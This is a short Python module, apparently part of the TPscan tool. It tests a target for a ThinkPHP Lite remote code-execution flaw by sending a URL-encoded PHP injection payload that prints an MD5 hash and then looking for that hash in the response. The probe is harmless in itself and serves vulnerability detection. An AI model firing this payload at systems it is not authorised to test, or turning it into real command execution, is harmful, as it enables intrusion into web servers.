#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "TPscan",
}

payload = "index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D"


async def thinkphp_lite_code_exec_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        url = urljoin(url, payload)
        resp = requests.get(url, headers=headers, timeout=15, verify=False)
        if '56540676a129760a3' in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = url
            pocdict['proof'] = '56540676a129760a3'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
